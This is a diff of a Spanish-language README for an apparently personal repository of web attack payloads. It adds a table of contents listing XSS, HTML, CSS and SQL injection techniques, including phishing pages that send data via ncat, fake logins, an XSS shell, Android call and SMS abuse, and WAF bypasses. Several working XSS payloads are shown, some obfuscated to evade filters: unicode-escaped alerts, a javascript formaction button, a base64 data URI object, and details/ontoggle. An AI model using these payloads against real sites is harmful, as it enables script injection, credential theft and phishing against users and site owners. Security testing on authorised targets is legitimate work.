@@ -1,9 +1,79 @@
 # Recopilación de todos los Payloads usados / creados por mi.
 
+En este repositorio encontrarías una lista de payloads que sirven para inyecciones xss, html, ccs y sql.
+
+La mayoria de los payloads aquí mostrados estan creados o modificados por mi.
+
+## INDICE 
+* [INYECCIÓNES XSS Y HTML](#INYECCIÓNES-XSS-Y-HTML)
+   * [h1](#h1)
+   * [onMouseOver](#onMouseOver)
+   * [input + onblur + Obfuscation](#input-+-onblur-+-Obfuscation)
+   * [html + onclik + Alert Obfuscation](#html-+-onclik-+-Alert-Obfuscation)
+   * [Xss dentro de un botón en form](#Xss-dentro-de-un-botón-en-form)
+   * [fake captcha](#fake-captcha)
+   * [Img + Onerror](#Img-+-Onerror)
+   * [marcas](#marcas)
+   * [Marquee + alert](#Marquee-+-alert)
+   * [noscript](#noscript)
+   * [redirección](#redirección)
+   * [JavaScript base 64](#JavaScript-base-64)
+   * [document.write + iframe](#document.write-+-iframe)
+   * [xss + Unicode](#xss-+-Unicode)
+   * [ontoggle](#ontoggle)
+   * [Filter Bypass Alert Obfuscation](#Filter-Bypass-Alert-Obfuscation)
+   * [HTML para simular un phishing y conseguir datos por ncat](#HTML-para-simular-un-phishing-y-conseguir-datos-por-ncat)
+   * [Fake login usando inyecciones xss, html y javascript](#Fake-login-usando-inyecciones-xss,-html-y-javascript)
+   * [xss shell](#xss-shell)
+   * [eventos](#eventos)
+   * [xss en android](#xss-en-android)
+   * [xss en android para iniciar llamada y enviar mensajes de texto:](#xss-en-android-para-iniciar-llamada-y-enviar-mensajes-de-texto:)
+   * [xss javascript navigator](#xss-javascript-navigator)
+   * [Muchos mas:](#Muchosmas:)
+* [Css injection](#Css-injection)
+* [sql injection](#sql-injection)
+   * [Payloads para sql inyection login bypass](#Payloads-para-sql-inyection-login-bypass)
+   * [Detectar un error sql](#Detectar-un-error-sql)
+   * [Detectar numero de columnas vulnerables](#Detectar-numero-de-columnas-vulnerables)
+   * [Union Select Payloads](#Union-Select-Payloads)
+   * [Union Select + sleep() + BENCHMARK(1000000,MD5('A')) Payloads](#Union-Select-+-sleep()-+-BENCHMARK(1000000,MD5('A'))-Payloads)
+   * [tecnicas para hacer bypass en sql inyection](#tecnicas-para-hacer-bypass-en-sql-inyection)
+       * [bypass usando comentarios](#bypass-usando-comentarios)
+       * [bypass usando comentarios + url encoding](#bypass-usando-comentarios-+-url-encoding)
+   * [Information_schema.tables](#Information_schema.tables)
+   * [Concat](#Concat)
+   * [group_concat](#group_concat)
+   * [Union Select](#Union-Select)
+   * [HTML URL Encode (Codificación Url)](#HTML-URL-Encode-(Codificación-Url))
+   * [Inyecciónes sql usando funciones sql](#Inyecciónes-sql-usando-funciones-sql)
+        * [Sql inyection payload usando la función RPAD y SOUNDS LIKE](#Sql-inyection-payload-usando-la-función-RPAD-y-SOUNDS-LIKE)
+        * [Sql inyection payload usando upper + reverse + right + sounds like para extraer información](#Sql-inyection-payload-usando-upper-+-reverse-+-right-+-sounds-like-para-extraer-información)
+        * [Sql inyection usando elt, doble Reverse, hex y unhex](#Sql-inyection-usando-elt,-doble-Reverse,-hex-y-unhex)
+        * [Sql inyection case](#Sql-inyection-case)
+        * [Sql inyection payload usando upper + reverse + right + sounds like](#Sql-inyection-payload-usando-upper-+-reverse-+-right-+-sounds-like)
+        * [SQL injection usando doble reverse + right + if statement + HTML injection](#SQL-injection-usando-doble-reverse-+-right-+-if-statement-+-HTML-injection)
+        * [Sql inyection usando las funciones HEX-UNHEX](#Sql-inyection-usando-las-funciones-HEX-UNHEX)
+        * [Inyección sql tipo error based usando Extractvalue](#Inyección-sql-tipo-error-based-usando-Extractvalue)
+        * [Sql inyection payload usando reverse](#Sql-inyection-payload-usando-reverse)
+        * [Sql inyection payload usando extractvalue:](#Sql-inyection-payload-usando-extractvalue:)
+        * [Sql inyection payload + url encode + timing](#Sql-inyection-payload-+-url-encode-+-timing)
+    * [Sql inyection + dios sql](#Sql-inyection-+-dios-sql)
+    * [Sql inyection Buffer Overflow / Firewall Crash bypass + xss inyection](#Sql-inyection-Buffer-Overflow-/-Firewall-Crash-bypass-+-xss-inyection)
+    * [sql inyection payload+ bypass Mod_Security](#sql-inyection-payload+-bypass-Mod_Security)
+    * [Sql inyection payload + comment + hex/unhex](#Sql-inyection-payload-+-comment-+-hex/unhex)
+    * [Sql inyection payload + url encode](#Sql-inyection-payload-+-url-encode)
+        
+   
+   
+  
+   
+   
 
 ### Para detectar errores: sql inyection, xss inyection y HTML inyection
 
 `'"><script>alert(1)</script><h1>d</h1>`
+
+## INYECCIÓNES XSS Y HTML
 
 ### h1
 
@@ -51,7 +121,7 @@ onMouseOver=<script>alert("/XSS BY Y000!/")</script>
 <p/onclick=self[`aler`%2b`t`]`\u0059\u0030\u0030\u0030`>d
 ```
 
-### Xss dentro de un botón en form:
+### Xss dentro de un botón en form
 
 `<form><button formaction=javascript&colon;alert('xss_by_Y000!')>_Y000!_`
 
@@ -117,7 +187,7 @@ window['location']['href']="http://google.com"
 ```
 
 
-### JavaScript
+### JavaScript base 64 
 
 `<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydGBZMDAwYDwvc2NyaXB0Pg=='></object>`
 
@@ -133,7 +203,7 @@ window['location']['href']="http://google.com"
 
 ### ontoggle
 
-`"><details/open/ontoggle=confirm`/xss_by_Y000!/`>`
+`"><details/open/ontoggle=confirm("/xss_by_Y000!/")>`
 
 ### XSSDoS
 
